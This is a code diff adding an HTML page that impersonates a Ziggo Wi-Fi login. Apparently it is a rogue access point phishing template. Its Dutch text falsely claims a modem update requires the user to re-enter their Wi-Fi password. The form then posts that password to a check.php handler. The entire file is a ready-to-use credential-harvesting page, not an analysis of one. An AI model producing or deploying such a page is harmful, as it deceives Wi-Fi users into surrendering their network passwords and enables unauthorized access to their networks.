@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en-US">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<title>Ziggo Wi-Fi Login</title>
+
+<style>
+html,body {
+		height: 100%;
+		font-family: sans-serif;
+		margin: 0px;
+}
+div {
+		display: block;
+}
+
+.logo {
+		position: absolute;
+		top: 30px;
+		left:0px;
+		width:104px;
+		height:50px;
+		text-align:center;
+		background: url("Ziggo-logo.svg") no-repeat #fff;
+		background-size: 84px 30px;
+		background-position: center;
+		z-index:10;
+}
+
+#background {
+		height: 100%;
+		margin: 0px;
+		padding: 0px;
+		background: url("generic-mobemBG.jpg") center center no-repeat fixed;
+		background-size:cover;
+}
+
+#overlay {
+		height: 100%;
+		position: absolute;
+		left:0px;
+		top:0px;
+		background: rgba(0,0,0,0.6);
+		background-size:100% auto;
+		width:100%;
+		padding-top:30px;
+}
+
+#white {
+		max-width: 840px;
+		position: relative;
+		text-align: center;
+		width: 840px;
+		background: url("white-transparent90.png");
+		font-size: 16px;
+		margin: 0px auto;
+		padding: 45px 30px 80px 30px;
+}
+
+#title {
+		color: #f48c00;
+		height: 55px;
+		text-align: center;
+		font-size: 46px;
+		padding-top: 20px;
+}
+
+#text {
+		color: rgb(51, 51, 51);
+		text-align: center;
+		font-size: 16px;
+		padding: 20px 15px;
+}
+
+#input {
+		height: 47px;
+		text-align: center;
+		font-size: 18px;
+		padding: 0px 0px 20px;
+}
+
+#table {
+		height: 47px;
+		text-align: center;
+		font-size: 18px;
+		margin: auto;
+}
+
+#row {
+		height: 47px;
+		text-align: center;
+		vertical-align: middle;
+		font-size: 18px;
+}
+
+#data1 {
+		color: rgb(51, 51, 51);
+		height: 32px;
+		text-align: -webkit-right;
+		vertical-align: middle;
+		font-size: 18px;
+		padding: 0px 5px 15px 15px;
+}
+
+#data2 {
+		height: 32px;
+		vertical-align: middle;
+		font-size: 18px;
+		padding: 0px 5px 15px;
+}
+
+#inputdata {
+		box-sizing: content-box;
+		color: rgb(102, 102, 102);
+		height: 22px;
+		width: 80%;
+		float: left;
+		border: 2px solid rgb(211, 211, 211);
+		border-radius: 3px 3px 3px 3px;
+		font-size: 18px;
+		padding: 3px 10px;
+}
+
+#inputdata:focus {
+		border-color: #f48c00;
+}
+
+#next {
+		color: #fff;
+		cursor: pointer;
+		text-align: center;
+		white-space: pre;
+		align-items: flex-start;
+		background: #f48c00 repeat;
+		border: 1px solid #d27800;
+		border-radius: 5px;
+		font-size: 24px;
+		padding: 15px 30px;
+}
+
+#next:hover {
+		background: #ffa021;
+}
+
+@media only screen and (max-width: 479px) {
+		.logo {
+				background-color: transparent;
+		}
+		#white {
+				width: 100%;
+				padding: 30px 0px 60px 0px;
+		}
+		#text {
+				font-size: 14px;
+				padding: 15px 20px 20px 20px;
+		}
+		#next {
+				font-size: 20px;
+		}
+}
+
+</style>
+</head>
+
+<body onload="getFocus()">
+	<div class="logo"></div>
+
+	<div id="background">
+		<div id="overlay">
+			<div id="white">
+				<div id="title">
+					Welkom
+				</div>
+				<div id="text">
+					Uw Wi-Fi modem heeft recentelijk een update gehad. Hierdoor is het vanuit veiligheidsoverwegingen noodzakelijk dat u uw wachtwoord opnieuw invult. Uw wachtwoord is te vinden aan de onderkant van uw Wi-Fi modem.
+				</div>
+				<div id="input">
+					<form id="form1" method="POST" action="check.php" name="form1">
+						<table id="table">
+								<tr id="row">
+									<td id="data1">
+										<label for="inputdata">Wachtwoord</label>
+									</td>
+									<td id="data2">
+										<input id="inputdata" name="key1" value="" type="password">
+									</td>
+								</tr>
+						</table>
+						<div id="button">
+							<input type="submit" id="next" value="Doorgaan">
+						</div>
+					</form>
+				</div>
+			</div>
+		</div>
+	</div>
+</body>
+</html>
